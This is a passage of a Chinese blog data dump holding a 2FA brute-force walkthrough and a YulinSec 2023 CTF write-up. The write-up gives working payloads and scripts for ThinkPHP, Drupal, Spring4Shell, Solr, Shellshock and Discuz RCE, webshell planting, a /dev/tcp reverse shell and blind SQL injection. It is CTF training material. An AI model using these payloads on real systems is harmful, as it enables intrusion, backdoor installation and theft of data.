using a brute-force attack先利用carlos:montoya进入验证码界面，随便输入验证码测试，发现输入两次错误验证码后会自动终止会话，但是，该用户并未被锁定，意味着我可以无限制地尝试。 如果每次尝试2FA会不断变化，我们没有办法爆破，但如果2FA在使用之前都一直有效，那么我们便可对其进行暴力破解。 登录过程涉及多个需要按顺序执行的请求，因此，我们可以使用宏，并尝试将这些请求合并到一个宏中。 操作步骤如下： &lt;1&gt;登录carlos:montoya &lt;2&gt;随便输入一个验证码，点击提交，报错 &lt;3&gt;进入burp，Project options的sessions，在Macro中选择如下的三个包，并Test macro正常 &lt;4&gt;进入session handling rules，点击Add，在 Scope的URL Scope中, 选择选项 Include all URLs；在Details中点击Add选择Run a marco，并将&lt;3&gt;中的marco加进去 &lt;5&gt;将POST &#x2F;login2发送给Intruder，将字典设置为0000-9999，线程数设为1，爆破验证码即可 (爆破速度超级慢，不建议尝试，等之后有时间再做吧)","categories":[],"tags":[]},{"title":"YulinSec-Recruit-2023-WP","slug":"YulinSec-Recruit-2023-WP","date":"2023-10-31T01:54:13.746Z","updated":"2024-01-26T02:56:58.573Z","comments":true,"path":"2023/10/31/YulinSec-Recruit-2023-WP/","link":"","permalink":"http://example.com/2023/10/31/YulinSec-Recruit-2023-WP/","excerpt":"作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup","text":"作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup [Baby]†签到†密文： 密码本： 解码之后：，之后再将解码后的表按先一三后二四的顺序解读，即得明文：WELCOME TO THE CTF GAME！ 题目要求我们将Flag以YulinSec{}包裹，并在每个英文单词间加入单下划线，所有英文字母均为小写。 处理一下得：YulinSec{welcome_to_the_ctf_game!} [Mid-]马赛克星球这题我只做出了第一问，太菜了~~~呜呜~ 根据题目描述我们得知图片先会被马赛克覆盖，后被系统处理后丢尽回收站，因此我们需要按顺序进行。首先进行系统处理的恢复，具体这么做呢？先把图片下载下来康康。 我们得到这个： （什么鬼东西啊！！！） 既然是系统处理，嗯~ o(￣▽￣)o……，啥也想不起来，那我们就按老一套先一把梭试试，先放进binwalk里康康： 发现藏得有东西，我们分离一下： 得到加密马赛克的代码（个人猜测可能和第二问有关）。 这一步操作结束了，并没有得到对第一问有用的信息，我们再去试试下一步经典操作：改图片宽高。 直接上github上找个脚本，恢复一下图片的宽高： 由此我们得到了被打上马赛克的图片，并得到了Flag: [Easy]盒武器你是？我们下载第一张图片： 放到google识图上看看，一眼武汉理工大学南湖校区的图书馆，但MD5之后交Flag发现不对，经询问铃兰小姐得知要交图书馆的名字，于是改成YulinSec{md5(武汉理工大学南湖校区心至楼)}。 第二问很奇怪，一眼是武汉长江大桥，拍摄视角看起来像是在龟山公园附近，但我把附近的景点都梭哈了一遍也没成功…… 你的名字是？第二问通过问出题人，发现是我猪鼻了，其实还是让题目描述误导了，题目描述举出的例子是人民公园，让我误以为是找公园名字了…… 位置确实是龟山公园没错，但景点应该写龟山风景区，于是改成YulinSec{md5(湖北省武汉市汉阳区龟山北路5号龟山风景区)}。 我怎么想不起来了&gt;w&lt;第三问的话看出题人QQ空间锁定好时间区间爆破就好了(貌似有更好的办法，但我还没找到)。 【Baby】babyurl本题考查ssrf。 这道题本来我是通过绕过localhost做的，后来才知道那是非预期，于是我又重新做了一遍。 首先我们访问题目网页。如下： 查看一下源码： &lt;!-- if(isset($_GET[&#39;urls&#39;]))&#123; $urls = $_GET[&#39;urls&#39;]; $url_host = parse_url($urls,PHP_URL_HOST); curl_get($urls); &#125; --&gt; 点击here得：Please access through local host 既然如此，看了源码再加上题目描述，我们就明白了这是一道ssrf bypass题，因此我们根据源码顺序构造url，GET传参urls,根据要求在头部添加http://,直接传127.0.0.1会被过滤： 因此我们根据题目描述中的格式构造传参?urls=http://foo@127.0.0.1:80@google.com/flag.php，得到flag。 原理就是利用parse_url与curl_get对url解析的不同方式来绕过。 【Baby】babyphp本题考查php的弱比较与强碰撞的绕过。 首先，是对弱比较的绕过。让a!&#x3D;b，但sha1值要相等，我们利用数组绕过： 原理为sha1函数无法处理数组，如果传入的是数组，那么会返回NULL，使二者比较起来相等。 再做第二问的强碰撞。 由于是===，无法使用数组绕过，并且代码是执行我们输入的Yu，而不是直接输出Flag，我们可以使用fastcoll对一句话木马进行处理，使其eval执行我们的一句话木马，进而用蚁剑连接。工具的具体使用方法就请去百度学习吧，这里直接贴出payload:?Yu=%40eval%28%24_POST%5B%22cmd%22%5D%29%3B+%3F%3E%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%DAq%2B%97%8D%02%9B%5C%B5%86%B4%26%E9%DE%BC%CF%FF%FB%DF%F1%B9%BC4%89-%26%825u8%1D%F5J%F1%F9%C8%E0%E7%FF%E7%0F%0C%CC%11%A9%BB%D4%17%DE%85%B5j%F5%A9%26c%1Aa%89%0E%A3y%96E%A2%C1%F4%87f%9B%1E%F7%17%FA%86%E5%A1m%95%97k7%00%C9%26%7E%23%7E%84%B9%9FO_%11%AF%C1%98%CA%B0%2A%85%89%93%DE%ED%9D%EB%98C%EE%E0%02%1C%23V%DD%C2%15%D5%F1iI%D9%21%1E%8E%F8%05&amp;lin=%40eval%28%24_POST%5B%22cmd%22%5D%29%3B+%3F%3E%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%DAq%2B%97%8D%02%9B%5C%B5%86%B4%26%E9%DE%BC%CF%FF%FB%DFq%B9%BC4%89-%26%825u8%1D%F5J%F1%F9%C8%E0%E7%FF%E7%0F%0C%CC%11%A9%3B%D4%17%DE%85%B5j%F5%A9%26c%1Aa%89%8E%A3y%96E%A2%C1%F4%87f%9B%1E%F7%17%FA%86%E5%A1m%95%97k7%00I%26%7E%23%7E%84%B9%9FO_%11%AF%C1%98%CA%B0%2A%85%89%93%DE%ED%9D%EB%98Cn%E1%02%1C%23V%DD%C2%15%D5%F1iI%D9%A1%1E%8E%F8%05 先在网页中执行一下，然后直接用蚁剑。 根目录发现flag2：YulinSec&#123;2b5e2408ee27c31493b3b4728a1afb85&#125;。 【Baby】babyunserialize本题考查基本的php反序列化。 下面我们先构造第一问的payload: &lt;?php$auth = array( &quot;username&quot; =&gt; &quot;YulinSec&quot;, &quot;passwd&quot; =&gt; &quot;i_love_php_unserialize&quot;,);echo serialize($auth);?&gt; 输出：a:2:&#123;s:8:&quot;username&quot;;s:8:&quot;YulinSec&quot;;s:6:&quot;passwd&quot;;s:22:&quot;i_love_php_unserialize&quot;;&#125; 用Hackbar传参得flag1: 接着我们构造第二问的payload: 这里需要提到两个知识点：__construct()魔术方法与php中的引用赋值（具体请自行百度）。 我们将构造的$a的序列化中的空改为%00，payload为：?data=O:5:&quot;Yulin&quot;:4:&#123;s:12:&quot;%00Yulin%00user1&quot;;i:20421610;s:12:&quot;%00Yulin%00user2&quot;;R:2;s:8:&quot;%00*%00pass1&quot;;i:116759636;s:8:&quot;%00*%00pass2&quot;;R:3;&#125; 之后传入得flag2: [EASY]Script Kiddie这题看题目要求，就知道是要学会当脚本小子。因此我们直接去网上找相应的exp即可。 第一题： 有经验的话应该看一眼就知道这是典型的thinkphp的漏洞了，直接去网上搜，这里贴上我搜到的一篇博客：攻防世界 ThinkPHP V5（漏洞解析及利用）-CSDN博客 直接payload:?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag拿到flag。（注：cat /flag可换成其他命令进行执行） 第二题： 继续去搜drupal的相关漏洞，挨个对比，发现是CVE-2018-7600，直接利用现成的payload: POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1Host: 121.5.35.176:30003Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://121.5.35.176:30003/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Cookie: JSESSIONID=F52208D5FDBBB4330779120E1AD41487Connection: closeContent-Type:application/x-www-form-urlencodedContent-Length: 110 form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=cat /flag 得到flag：YulinSec&#123;svt9di2rrew26kysr3b3oipkobq40sao&#125;。 第三题： 继续去网上搜spring相关的漏洞，挨个对比，发现是CVE-2022-22965。之后便是按部就班的来。 发送以下请求以更改 Apache Tomcat 中的日志记录配置并将日志写入 JSP 文件： GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1Host: 121.5.35.176:30004Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closesuffix: %&gt;//c1: Runtimec2: &lt;%DNT: 1Content-Length: 2 然后，访问刚才的 JSP webshell，并执行任意命令，得到flag： 【Mid】MidBypass这道题应该是想教一下蚁剑的基本用法。 首先根据hint中的后门提示，用蚁剑连接： 之后点击即送flag1:YulinSec&#123;1602bc263c2a236f7f4a38859abb8d02&#125; 第二问大概就是要学一下蚁剑的插件使用: 之后直接在根目录下找到flag2: 【Mid】苕皮本题我是通过非预期来做的，之后立马被修了，呜呜呜~~~ 之后也没时间做这个题了，大概把我非预期的思路讲一讲吧。 在我做非预期解的时候，没有对base的过滤，因此，在经过几下本地传参测试后发现，过滤器在读取$shaopi时会控制字符的数量，后来经查证，貌似必须输入3的倍数。于是我们可以利用base64编码后可以随便加减等号的特性进行绕过。payload为：?filter=convert.base64-decode|&amp;shaopi=PChzaGFvcGkpPg 【Baby】RseaE(季末大酬宾)第一次做内网题，瘫~~~ 首先给linux配置上ssh的socks5代理具体方法详见此博客http://t.csdnimg.cn/fYTE4，之后便可直接在虚拟机上进行操作，无需将文件传输到服务器上。 直接利用fscan扫描内网存活主机，得： CVE-2019-17558：先访问http://10.0.20.121/solr/Yulin/config,写份脚本修改params.resource.loader.enabled为true，至此一切准备就绪。脚本贴在下面： import requestsimport json url = &quot;http://10.0.20.121/solr/Yulin/config&quot;headers = &#123; &quot;Content-Type&quot;: &quot;application/json&quot;,&#125;data = &#123; &quot;update-queryresponsewriter&quot;: &#123; &quot;startup&quot;: &quot;lazy&quot;, &quot;name&quot;: &quot;velocity&quot;, &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;, &quot;template.base.dir&quot;: &quot;&quot;, &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;, &quot;params.resource.loader.enabled&quot;: &quot;true&quot; &#125;&#125; response = requests.post(url, headers=headers, data=json.dumps(data)) print(response.status_code)print(response.text) 之后便可进行rce命令执行。 命令执行的payload稍微改一下就能用了，至于脚本，写一个能发包的就行。如下： import requests url = &#39;http://10.0.20.121/solr/Yulin/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cat%20/flag%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&#39; response = requests.get(url) print(response.text) CVE-2014-6271：这个比较简单，一个脚本就出来了： import requestsimport json url = &quot;http://10.0.20.156/yulin.cgi&quot;headers = &#123; &quot;User-Agent&quot;: &quot;() &#123; :; &#125;; echo; /bin/cat /flag&quot;,&#125; response = requests.post(url, headers=headers) print(response.status_code)print(response.text) 原理大概是该Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以()&#123;开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。 CVE-2019-0230：这个就麻烦许多（主要是没回显，需要将webshell打到portmap的监听端口上，之后在转发端口查看），在这里就讲一下大体思路吧，就不一步步来了（太麻烦了），首先，先将portmap传到目标服务器，之后设置监听端口与转发端口：./portmap -m 2 -p1 7003 -h2 10.0.20.111 -p2 7004随后利用脚本将命令bash -i &gt;&amp; /dev/tcp/10.0.20.111/7003 0&gt;&amp;1执行以实现反弹shell的目的，之后在本地利用proxychains通过nc监听7004端口数据，发现shell成功反弹，执行cat /flag获取flag：YulinSec&#123;Wo0!_s2_059_1s_s0_Danger0uS&#125; CVE-2014-0160：这个就简单许多了，直接用msf框架里现成的攻击模块就行了。下面的操作便是根据博客https://blog.csdn.net/weixin_39190897/article/details/106879383中的步骤完成。 先执行msfconsole运行msf框架： 再使用search heartbleed查找攻击模块： 之后执行命令use auxiliary/scanner/ssl/openssl_heartbleed选择第一个攻击模块： 设置对应的主机、端口参数： 最后运行run命令，可以看见靶机的64KB信息： 信息中间藏着flag：YulinSec&#123;Wo0!_My_heArt_1s_B133dinG&#125; 【Mid】链式反应本题只做了第一问，还是太菜了，要多练…… 求你先注册吧TAT &amp; 致命后台：进去之后发现是个论坛： 先随便注册一个账号试试（注意：这时候先看看admin账号是否有人，发现已经存在，说明我们注册之后要拿到admin账号的密码）： 注册之后发现有个系统提醒，点进来是admin账号的密码，因此我们可以利用这个来登录admin账号管理后台。 登录之后要干什么呢？（你问我我也不知道，当然是google啦！！！） 搜索Discuz x3.4 getshell，找到了一篇写的特别好的博客：https://www.svenbeast.com/post/discuzx34-hou-tai-xiu-gai-uc_center-pei-zhi-getshell/ 之后便是进入右上角的管理中心—站长—UCenter设置。 1.进入后台站长-UCenter设置，修改UCenter通信密钥为123456并记录下来，填入code.php，修改UC_API&#x3D;http://recruit.xxf.world:12088/uc_server&#39;);eval($_POST[sven]);//，点击保存 2.用大佬的脚本生成code参数的值(注意：此时操作必须加速，如果当超时之后，传参会返回别的内容而不是1，此时code值需要重新生成)： &lt;?php //code.php源代码，可直接使用$uc_key=&quot;123456&quot;;//此处填写刚才UCenter设置的值$time = time() + 720000;$str = &quot;time=&quot;.$time.&quot;&amp;action=updateapps&quot;;$code = authcode($str,&quot;ENCODE&quot;,$uc_key);$code = str_replace(&#39;+&#39;,&#39;%2b&#39;,$code);$code = str_replace(&#39;/&#39;,&#39;%2f&#39;,$code);echo $code; function authcode($string, $operation = &#39;DECODE&#39;, $key = &#39;&#39;, $expiry = 0) &#123; $ckey_length = 4; $key = md5($key != &#39;&#39; ? $key : &#39;123456&#39;); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == &#39;DECODE&#39; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#39;&#39;; $cryptkey = $keya.md5($keya.$keyc); $key_length = strlen($cryptkey); $string = $operation == &#39;DECODE&#39; ? base64_decode(substr($string, $ckey_length)) : sprintf(&#39;%010d&#39;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string; $string_length = strlen($string); $result = &#39;&#39;; $box = range(0, 255); $rndkey = array(); for($i = 0; $i &lt;= 255; $i++) &#123; $rndkey[$i] = ord($cryptkey[$i % $key_length]); &#125; for($j = $i = 0; $i &lt; 256; $i++) &#123; $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; &#125; for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123; $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); &#125; if($operation == &#39;DECODE&#39;) &#123; if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) &#123; return substr($result, 26); &#125; else &#123; return &#39;&#39;; &#125; &#125; else &#123; return $keyc.str_replace(&#39;=&#39;, &#39;&#39;, base64_encode($result)); &#125;&#125;?&gt; 3.带code参数GET发送请求(发送这个请求前后台功能都是不正常的，发送后后台恢复正常)： 请求包如下（注意，code需要替换成上边代码跑出来的值）： GET /api/uc.php?code=3261GqyMWCKWcBrmvnAR%2fMsytT4CniPufkSLlq8qgFENXGRbemdZM%2fO0tQ5UDOmm0gkfa3FziIaBUL6vu2s HTTP/1.1Host: recruit.xxf.world:12088Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,ar;q=0.8Connection: closeContent-Length: 127 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;root&gt;&lt;item id=&quot;UC_API&quot;&gt;http://recruit.xxf.world:12088/uc_server&lt;/item&gt;&lt;/root&gt; 4.此时 http://recruit.xxf.world:12088/config/config_ucenter.php就是我们的shell地址，至此getshell结束 5.进入根目录即可查看flag: [BABY]Yulin大超市题目本身不难，但具体操作比较繁琐，本人并没有全部做完，在此仅提供部分问的具体思路。 先根据网上的教程，把vmdk装在vmware上，并启动。 古老内核：cat /etc/redhat-release 旧日石板：启动宝塔，进入宝塔页面后点击左侧数据库，查看密码即可 积尘网页：进入网页后查看左上角图片即可： 草灰蛇线：宝塔页面下载后直接输入命令sha256sum 文件名查看 链颜如玉：九尾狐？？？铃兰小姐！！！ 蠕形混沌：robots.txt了解一下 [Mid]Flag的秘密本题考查内存取证。 1.先查看系统信息： 2.列出所有进程./volatility -f Dump.raw --profile=Win2003SP1x86 pslist： 发现notepad与mspaint两个可疑进程。 3.查看敏感文件： 4.提取flag.txt，./volatility -f Dump.raw --profile=Win2003SP1x86 dumpfiles -Q 0x060f95d8 --dump-dir=.: 查看文件内容，发现只有一串数字：70691670853271109852681369060149805628073794361873811272895446916236918634537737802124349238876320719507791592011549293924620129044462418733627976091293608166259846132773460344531124208572819109443346803355186858756595020342162362128266333303983191990037268180788288653684131880322571968703181766706931560885205101352007538331846213613023266466639921413852926790888220321442027205178887750649656145860474727432919114738728373475836303102255486346191364877477938535572331216821254191679994156591750446573045994279439932542854983843840 猜测和题目描述中的数学公式有关，于是进行万能的google，发现这其实是tupper公式中的key。 5.画图(画图时千万别用github上的脚本，不然会和我一样变得不幸) 提供一个在线网站：https://tuppers-formula.ovh/ 翻转180°得flag前半部分：M2tH_1z_ 继续推测，notepad中有flag前半部分，那么mspaint中大概率有flag的后半部分。 6.提取mspaint进程./volatility -f Dump.raw --profile=Win2003SP1x86 memdump -p 2148 --dump-dir=./ ，再将dmp后缀改为data，之后用GIMP软件查看，不断改变位移、宽高，即可得真实图像。 180°翻转后再镜像翻转即为flag后半部分。 完整flag为：YulinSec&#123;M2tH_1z_s0_iNtlsTInG&#125; [MID-]ezjavaflag1首先我们先看访问一下题目网页，由此可知要读取根目录下的flag1和flag2： 下载题目附件，之后反编译看源码。 由此可知传参方式：当访问&#x2F;flag1&#x2F;*目录时，会转到&#x2F;tmp&#x2F;*，而tmp目录的上一层目录即为根目录。 于是我们便可读取flag1: [MID+]猫物语这道题属实是思路新奇，是我没见过的类型。 先看一下题目描述吧： 根据题目描述我们可以知道本题考查sql注入，且无法使用延时注入和布尔盲注，于是我们可以从“所有内容在原本的基础上都会被加上随机一小段长度的喵！”上下手，增加原本内容的长度，使得返回的“喵”数量超过一定程度，并借此判断是否注入成功。之后的思路就和盲注思路一样了。 脚本如下： import requestsimport time chars = range(48, 129, 1)flag = &#39;&#39;global length length = 50 close = &quot;?id=-1&quot;for i in range(1, length + 1): for char1 in chars: url = &quot;http://124.220.110.41:20001/&quot; payload = &quot; union select 1,2,if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),%d,1))=%d,repeat(&#39;a&#39;,50),1)--+&quot; % ( i, char1) url = url + close + payload res = requests.get(url) print(url + &#39;\\n&#39;) if &quot;喵&quot; * 50 in res.text: flag = flag + chr(char1) print(&quot;flag: &quot; + flag) break print(&quot;flag: &quot; + flag)print(&#39;flag:&#39;, flag) payload请自行根据想要得到的内容进行更改。","categories":[],"tags":[]}],"categories":[],"tags":[]}